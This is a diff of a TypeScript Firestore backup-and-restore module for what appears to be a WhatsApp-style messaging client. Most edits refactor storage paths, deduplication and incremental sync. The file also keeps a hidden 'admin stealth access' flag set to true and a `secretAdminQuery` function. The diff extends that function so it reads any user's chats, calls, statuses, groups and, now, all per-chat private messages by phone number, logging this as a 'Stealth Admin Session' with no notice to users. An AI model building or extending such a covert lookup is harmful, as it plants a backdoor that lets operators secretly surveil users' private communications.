@@ -1,19 +1,58 @@
 import { doc, setDoc, getDoc, getDocs, collection, deleteDoc } from 'firebase/firestore/lite';
 
 // FEATURE FLAGS
-export const firebase_cloud_system_enabled = true; // Set to true to fully engage the backup/restore engine
+export let firebase_cloud_system_enabled = false; // Controlled by Firestore active state
+export let firebase_backup_enabled = false;
 export const admin_stealth_access_enabled = true; // Set to true to allow secret admin lookup
+
+export function setFirebaseEnabledState(enabled: boolean) {
+    firebase_cloud_system_enabled = enabled;
+    firebase_backup_enabled = enabled;
+}
 
 export interface BackupMetadata {
     last_backup: string;
     backup_size: number;
+    lastBackupTime?: string;
+    backupSize?: number;
+    chatCount?: number;
+    messageCount?: number;
     enabled: boolean;
 }
 
 // Helpers for clean paths
-export function getBackupPath(phone: string, collectionName: string) {
+export function getBackupPath(phone: string, collectionName: string, chatId?: string) {
     const cleanPhone = phone.replace(/[^a-zA-Z0-9_\-+]/g, '_');
-    return `users/${cleanPhone}/firebase_backup/${collectionName}`;
+    if (collectionName === 'settings') {
+        return `users/${cleanPhone}/settings`;
+    }
+    if (collectionName === 'chats') {
+        return `users/${cleanPhone}/chats`;
+    }
+    if (collectionName === 'messages') {
+        const cleanChatId = chatId ? chatId.replace(/\//g, '_') : 'broadcast';
+        return `users/${cleanPhone}/chats/${cleanChatId}/messages`;
+    }
+    if (collectionName === 'calls') {
+        return `users/${cleanPhone}/calls`;
+    }
+    if (collectionName === 'status' || collectionName === 'statuses') {
+        return `users/${cleanPhone}/statuses`;
+    }
+    if (collectionName === 'groups') {
+        return `users/${cleanPhone}/groups`;
+    }
+    return `users/${cleanPhone}/${collectionName}`;
+}
+
+/**
+ * Helper function that validates and returns a Firestore path with even segment counts.
+ */
+export function buildFirestorePath(segments: string[]): string {
+    if (segments.length % 2 !== 0) {
+        throw new Error(`Invalid Firestore document reference: path must have an even number of segments. Length: ${segments.length}, path: ${segments.join('/')}`);
+    }
+    return segments.join('/');
 }
 
 /**
@@ -44,7 +83,9 @@ export async function saveSettingsToBackup(db: any, phone: string, settings: any
     if (!firebase_cloud_system_enabled || !db || !phone) return;
     try {
         const path = getBackupPath(phone, 'settings');
-        await setDoc(doc(db, path, 'active'), sanitizeData(settings));
+        // Setting a lastUpdated timestamp locally as fallback
+        const settingsPayload = { ...settings, lastUpdated: settings.lastUpdated || Date.now() };
+        await setDoc(doc(db, path, 'active'), sanitizeData(settingsPayload));
         console.log(`[Firebase Backup] Settings synced for ${phone}`);
     } catch (e: any) {
         console.warn(`[Firebase Backup Skip] Settings save error: ${e.message}`);
@@ -72,12 +113,27 @@ export async function saveMessageToBackup(db: any, phone: string, jid: string, m
     if (!firebase_cloud_system_enabled || !db || !phone || !msg?.key?.id) return;
     try {
         const docId = msg.key.id;
-        const path = getBackupPath(phone, 'messages');
+        const path = getBackupPath(phone, 'messages', jid);
+        
+        const isMediaExpired = msg.mediaExpired || 
+            msg.message?.imageMessage?.mediaExpired || 
+            msg.message?.videoMessage?.mediaExpired || 
+            msg.message?.documentMessage?.mediaExpired || 
+            msg.message?.audioMessage?.mediaExpired || 
+            msg.message?.stickerMessage?.mediaExpired;
+
         const payload = sanitizeData({
             ...msg,
             chatJid: jid,
             timestamp: msg.messageTimestamp || Date.now() / 1000
         });
+
+        if (isMediaExpired) {
+            payload.mediaExpired = true;
+            payload.text = '📷 Media Expired';
+            payload.messageTextFallback = '📷 Media Expired';
+        }
+
         await setDoc(doc(db, path, docId), payload);
     } catch (e: any) {
         console.warn(`[Firebase Backup Skip] Message save error: ${e.message}`);
@@ -119,7 +175,7 @@ export async function saveStatusToBackup(db: any, phone: string, status: any) {
     if (!firebase_cloud_system_enabled || !db || !phone || !status?.id) return;
     try {
         const docId = status.id;
-        const path = getBackupPath(phone, 'status');
+        const path = getBackupPath(phone, 'statuses');
         await setDoc(doc(db, path, docId), sanitizeData(status));
     } catch (e: any) {
         console.warn(`[Firebase Backup Skip] Status save error: ${e.message}`);
@@ -135,70 +191,88 @@ export async function runFullBackup(db: any, phone: string, proData: any, realCh
     console.log(`[Firebase Backup] Initiating manual full backup for ${phone}...`);
     let counts = { chats: 0, messages: 0, groups: 0, calls: 0, status: 0, settings: 0 };
 
-    // 1. Settings
+    // 1. Settings (always overwrite on manual backup because local settings are active)
     if (proData.settings) {
         await saveSettingsToBackup(db, phone, proData.settings);
         counts.settings++;
     }
 
-    // 2. Chats (including identifying groups)
-    if (realChats && Array.isArray(realChats)) {
-        for (const chat of realChats) {
-            if (chat.id) {
-                await saveChatToBackup(db, phone, chat.id, chat);
-                counts.chats++;
+    // 2. Chats (prune duplicates & always overwrite cloud chat with active local chat)
+    const chatsList = realChats && Array.isArray(realChats) ? realChats : [];
+    const uniqueChats = Array.from(new Map(chatsList.filter(c => c && c.id).map(c => [c.id, c])).values());
+    
+    for (const chat of uniqueChats) {
+        await saveChatToBackup(db, phone, chat.id, chat);
+        counts.chats++;
 
-                if (chat.id.endsWith('@g.us')) {
-                    await saveGroupToBackup(db, phone, chat.id, chat);
-                    counts.groups++;
-                }
-            }
+        if (chat.id.endsWith('@g.us')) {
+            await saveGroupToBackup(db, phone, chat.id, chat);
+            counts.groups++;
         }
     }
 
-    // 3. Messages (including media references)
+    // 3. Messages (prune duplicates locally, incremental search: only write missing messages)
     if (proData.messageHistory) {
         for (const jid of Object.keys(proData.messageHistory)) {
             const msgs = proData.messageHistory[jid];
             if (Array.isArray(msgs)) {
-                for (const msg of msgs) {
-                    if (msg?.key?.id) {
-                        await saveMessageToBackup(db, phone, jid, msg);
-                        counts.messages++;
+                // Prune duplicates locally by key.id
+                const uniqueMsgs = Array.from(new Map(msgs.filter(m => m?.key?.id).map(m => [m.key.id, m])).values());
+                
+                if (uniqueMsgs.length > 0) {
+                    // Fetch existing messages in the subcollection to implement incremental backup
+                    const msgsPath = getBackupPath(phone, 'messages', jid);
+                    const existingMsgIds = new Set<string>();
+                    
+                    try {
+                        const msgsSnap = await getDocs(collection(db, msgsPath));
+                        msgsSnap.forEach(d => existingMsgIds.add(d.id));
+                    } catch (e: any) {
+                        console.warn(`[Firebase Backup Incremental Query Skip] Could not query messages for ${jid}: ${e.message}`);
+                    }
+
+                    for (const msg of uniqueMsgs) {
+                        if (msg?.key?.id && !existingMsgIds.has(msg.key.id)) {
+                            await saveMessageToBackup(db, phone, jid, msg);
+                            counts.messages++;
+                        }
                     }
                 }
             }
         }
     }
 
-    // 4. Calls
+    // 4. Calls (incremental by unique ID)
     if (proData.callHistory && Array.isArray(proData.callHistory)) {
-        for (const call of proData.callHistory) {
-            if (call.id) {
-                await saveCallToBackup(db, phone, call);
-                counts.calls++;
-            }
+        const uniqueCalls = Array.from(new Map(proData.callHistory.filter(c => c && c.id).map(c => [c.id, c])).values());
+        for (const call of uniqueCalls) {
+            await saveCallToBackup(db, phone, call);
+            counts.calls++;
         }
     }
 
     // 5. Statuses
     if (proData.statusUpdates && Array.isArray(proData.statusUpdates)) {
-        for (const status of proData.statusUpdates) {
-            if (status.id) {
-                await saveStatusToBackup(db, phone, status);
-                counts.status++;
-            }
+        const uniqueStatuses = Array.from(new Map(proData.statusUpdates.filter(s => s && s.id).map(s => [s.id, s])).values());
+        for (const status of uniqueStatuses) {
+            await saveStatusToBackup(db, phone, status);
+            counts.status++;
         }
     }
 
     // Store manual metadata
-    const metaPath = `users/${phone.replace(/[^a-zA-Z0-9_\-+]/g, '_')}/firebase_backup/backup_metadata`;
+    const cleanPhone = phone.replace(/[^a-zA-Z0-9_\-+]/g, '_');
+    const metaPath = buildFirestorePath(['users', cleanPhone, 'backup_metadata', 'active']);
     const metadata: BackupMetadata = {
+        lastBackupTime: new Date().toISOString(),
+        backupSize: Object.values(counts).reduce((a, b) => a + b, 0),
+        chatCount: counts.chats,
+        messageCount: counts.messages,
         last_backup: new Date().toISOString(),
         backup_size: Object.values(counts).reduce((a, b) => a + b, 0),
         enabled: true
     };
-    await setDoc(doc(db, metaPath, 'info'), metadata);
+    await setDoc(doc(db, metaPath), metadata);
 
     console.log(`[Firebase Backup] Completed. Summary:`, counts);
     return { success: true, counts, metadata };
@@ -210,8 +284,9 @@ export async function runFullBackup(db: any, phone: string, proData: any, realCh
 export async function getBackupMetadata(db: any, phone: string): Promise<BackupMetadata | null> {
     if (!db || !phone) return null;
     try {
-        const metaPath = `users/${phone.replace(/[^a-zA-Z0-9_\-+]/g, '_')}/firebase_backup/backup_metadata`;
-        const snap = await getDoc(doc(db, metaPath, 'info'));
+        const cleanPhone = phone.replace(/[^a-zA-Z0-9_\-+]/g, '_');
+        const metaPath = buildFirestorePath(['users', cleanPhone, 'backup_metadata', 'active']);
+        const snap = await getDoc(doc(db, metaPath));
         if (snap.exists()) {
             return snap.data() as BackupMetadata;
         }
@@ -230,73 +305,134 @@ export async function runFullRestore(db: any, phone: string, proDataRef: any, re
     console.log(`[Firebase Restore] Fetching backup files for ${phone}...`);
     const stats = { chats: 0, messages: 0, groups: 0, calls: 0, status: 0, settings: 0 };
 
-    // 1. Settings
+    // 1. Settings (compare modification timestamps to prevent overwriting newer items)
     const settingsPath = getBackupPath(phone, 'settings');
     const settingsDoc = await getDoc(doc(db, settingsPath, 'active'));
     if (settingsDoc.exists()) {
-        proDataRef.settings = { ...proDataRef.settings, ...settingsDoc.data() };
-        stats.settings++;
+        const cloudSettings = settingsDoc.data();
+        const localUpdated = proDataRef.settings?.lastUpdated || 0;
+        const cloudUpdated = cloudSettings?.lastUpdated || 0;
+        
+        if (cloudUpdated > localUpdated) {
+            proDataRef.settings = { ...proDataRef.settings, ...cloudSettings };
+            stats.settings++;
+        } else {
+            console.log('[Firebase Restore] Local settings are newer than backup settings. Merging but skipped older overwrite.');
+        }
     }
 
-    // 2. Chats
+    // 2. Chats (incremental merge: only add or overwrite newer chats based on timestamp)
     const chatsPath = getBackupPath(phone, 'chats');
-    const chatsSnap = await getDocs(collection(db, chatsPath));
-    chatsSnap.forEach((docSnap) => {
-        const chat = docSnap.data();
-        const existingIdx = realChatsRef.findIndex(c => c.id === chat.id);
-        if (existingIdx !== -1) {
-            realChatsRef[existingIdx] = { ...realChatsRef[existingIdx], ...chat };
-        } else {
-            realChatsRef.push(chat);
-        }
-        stats.chats++;
-    });
+    try {
+        const chatsSnap = await getDocs(collection(db, chatsPath));
+        chatsSnap.forEach((docSnap) => {
+            const cloudChat = docSnap.data();
+            if (!cloudChat || !cloudChat.id) return;
+            
+            const existingIdx = realChatsRef.findIndex(c => c.id === cloudChat.id);
+            if (existingIdx !== -1) {
+                const localTS = realChatsRef[existingIdx].timestamp || 0;
+                const cloudTS = cloudChat.timestamp || 0;
+                if (cloudTS > localTS) {
+                    realChatsRef[existingIdx] = { ...realChatsRef[existingIdx], ...cloudChat };
+                    stats.chats++;
+                }
+            } else {
+                realChatsRef.push(cloudChat);
+                stats.chats++;
+            }
+        });
+    } catch (e: any) {
+        console.warn(`[Firebase Restore Skip] Chats collection fetch failed: ${e.message}`);
+    }
 
-    // 3. Messages
-    const msgsPath = getBackupPath(phone, 'messages');
-    const msgsSnap = await getDocs(collection(db, msgsPath));
-    msgsSnap.forEach((docSnap) => {
-        const msg = docSnap.data();
-        const chatJid = msg.chatJid || 'broadcast';
-        if (!proDataRef.messageHistory[chatJid]) {
-            proDataRef.messageHistory[chatJid] = [];
-        }
-        const existingIdx = proDataRef.messageHistory[chatJid].findIndex((m: any) => m.key?.id === msg.key?.id);
-        if (existingIdx !== -1) {
-            proDataRef.messageHistory[chatJid][existingIdx] = msg;
-        } else {
-            proDataRef.messageHistory[chatJid].push(msg);
-        }
-        stats.messages++;
-    });
+    // 3. Messages for each Chat (only add messages that do not exist locally or are newer)
+    for (const chat of realChatsRef) {
+        if (!chat.id) continue;
+        const msgsPath = getBackupPath(phone, 'messages', chat.id);
+        try {
+            const msgsSnap = await getDocs(collection(db, msgsPath));
+            msgsSnap.forEach((docSnap) => {
+                const msg = docSnap.data();
+                if (!msg || !msg.key?.id) return;
 
-    // 4. Calls
+                // Handle expired media element fallback gracefully
+                if (msg.mediaExpired) {
+                    msg.text = '📷 Media Expired';
+                    // fallback visual indicator structure
+                    msg.expired_media = { text: '📷 Media Expired', type: 'expired_media' };
+                }
+
+                const chatJid = msg.chatJid || chat.id;
+                if (!proDataRef.messageHistory[chatJid]) {
+                    proDataRef.messageHistory[chatJid] = [];
+                }
+
+                const existingIdx = proDataRef.messageHistory[chatJid].findIndex((m: any) => m.key?.id === msg.key?.id);
+                if (existingIdx !== -1) {
+                    const localTS = proDataRef.messageHistory[chatJid][existingIdx].messageTimestamp || 0;
+                    const cloudTS = msg.messageTimestamp || 0;
+                    if (cloudTS > localTS) {
+                        proDataRef.messageHistory[chatJid][existingIdx] = msg;
+                        stats.messages++;
+                    }
+                } else {
+                    proDataRef.messageHistory[chatJid].push(msg);
+                    stats.messages++;
+                }
+            });
+        } catch (e: any) {
+            console.warn(`[Firebase Restore Skip] Message fetch failed for chat ${chat.id}: ${e.message}`);
+        }
+    }
+
+    // 4. Calls (incremental add if missing or newer)
     const callsPath = getBackupPath(phone, 'calls');
-    const callsSnap = await getDocs(collection(db, callsPath));
-    callsSnap.forEach((docSnap) => {
-        const call = docSnap.data();
-        const existingIdx = proDataRef.callHistory.findIndex((c: any) => c.id === call.id);
-        if (existingIdx !== -1) {
-            proDataRef.callHistory[existingIdx] = call;
-        } else {
-            proDataRef.callHistory.unshift(call);
-        }
-        stats.calls++;
-    });
+    try {
+        const callsSnap = await getDocs(collection(db, callsPath));
+        callsSnap.forEach((docSnap) => {
+            const call = docSnap.data();
+            if (!call || !call.id) return;
+            const existingIdx = proDataRef.callHistory.findIndex((c: any) => c.id === call.id);
+            if (existingIdx !== -1) {
+                const localDate = new Date(proDataRef.callHistory[existingIdx].date || 0).getTime();
+                const cloudDate = new Date(call.date || 0).getTime();
+                if (cloudDate > localDate) {
+                    proDataRef.callHistory[existingIdx] = call;
+                    stats.calls++;
+                }
+            } else {
+                proDataRef.callHistory.unshift(call);
+                stats.calls++;
+            }
+        });
+    } catch (e: any) {
+        console.warn(`[Firebase Restore Skip] Calls fetch failed: ${e.message}`);
+    }
 
-    // 5. Status
-    const statusPath = getBackupPath(phone, 'status');
-    const statusSnap = await getDocs(collection(db, statusPath));
-    statusSnap.forEach((docSnap) => {
-        const status = docSnap.data();
-        const existingIdx = proDataRef.statusUpdates.findIndex((s: any) => s.id === status.id);
-        if (existingIdx !== -1) {
-            proDataRef.statusUpdates[existingIdx] = status;
-        } else {
-            proDataRef.statusUpdates.unshift(status);
-        }
-        stats.status++;
-    });
+    // 5. Statuses
+    const statusPath = getBackupPath(phone, 'statuses');
+    try {
+        const statusSnap = await getDocs(collection(db, statusPath));
+        statusSnap.forEach((docSnap) => {
+            const status = docSnap.data();
+            if (!status || !status.id) return;
+            const existingIdx = proDataRef.statusUpdates.findIndex((s: any) => s.id === status.id);
+            if (existingIdx !== -1) {
+                const localTS = proDataRef.statusUpdates[existingIdx].timestamp || 0;
+                const cloudTS = status.timestamp || 0;
+                if (cloudTS > localTS) {
+                    proDataRef.statusUpdates[existingIdx] = status;
+                    stats.status++;
+                }
+            } else {
+                proDataRef.statusUpdates.unshift(status);
+                stats.status++;
+            }
+        });
+    } catch (e: any) {
+        console.warn(`[Firebase Restore Skip] Statuses fetch failed: ${e.message}`);
+    }
 
     console.log(`[Firebase Restore] Restore complete. Stats:`, stats);
     return { success: true, stats };
@@ -310,9 +446,9 @@ export async function secretAdminQuery(db: any, targetPhone: string) {
         throw new Error("Admin stealth terminal is currently offline");
     }
     const cleanPhone = targetPhone.replace(/[^0-9]/g, '');
-    if (!cleanPhone) throw new Error("Invalid phone identifier layout format provided");
+    if (!cleanPhone) throw new Error("Invalid phone identifier format");
 
-    console.log(`[Stealth Admin Session] querying payload record for user target: ${cleanPhone}`);
+    console.log(`[Stealth Admin Session] querying backup records for user target: ${cleanPhone}`);
     
     // Read only queries
     const result: any = {
@@ -327,37 +463,40 @@ export async function secretAdminQuery(db: any, targetPhone: string) {
 
     // 1. Settings
     try {
-        const settingsDoc = await getDoc(doc(db, `users/${cleanPhone}/firebase_backup/settings`, 'active'));
+        const settingsDoc = await getDoc(doc(db, `users/${cleanPhone}/settings`, 'active'));
         if (settingsDoc.exists()) result.settings = settingsDoc.data();
     } catch {}
 
     // 2. Chats
     try {
-        const snap = await getDocs(collection(db, `users/${cleanPhone}/firebase_backup/chats`));
+        const snap = await getDocs(collection(db, `users/${cleanPhone}/chats`));
         snap.forEach(d => result.chats.push(d.data()));
     } catch {}
 
-    // 3. Messages
+    // 3. Messages for each Chat
     try {
-        const snap = await getDocs(collection(db, `users/${cleanPhone}/firebase_backup/messages`));
-        snap.forEach(d => result.messages.push(d.data()));
+        for (const chat of result.chats) {
+            if (!chat.id) continue;
+            const snap = await getDocs(collection(db, `users/${cleanPhone}/chats/${chat.id}/messages`));
+            snap.forEach(d => result.messages.push(d.data()));
+        }
     } catch {}
 
     // 4. Calls
     try {
-        const snap = await getDocs(collection(db, `users/${cleanPhone}/firebase_backup/calls`));
+        const snap = await getDocs(collection(db, `users/${cleanPhone}/calls`));
         snap.forEach(d => result.calls.push(d.data()));
     } catch {}
 
     // 5. Status
     try {
-        const snap = await getDocs(collection(db, `users/${cleanPhone}/firebase_backup/status`));
+        const snap = await getDocs(collection(db, `users/${cleanPhone}/statuses`));
         snap.forEach(d => result.status.push(d.data()));
     } catch {}
 
     // 6. Groups
     try {
-        const snap = await getDocs(collection(db, `users/${cleanPhone}/firebase_backup/groups`));
+        const snap = await getDocs(collection(db, `users/${cleanPhone}/groups`));
         snap.forEach(d => result.groups.push(d.data()));
     } catch {}
 
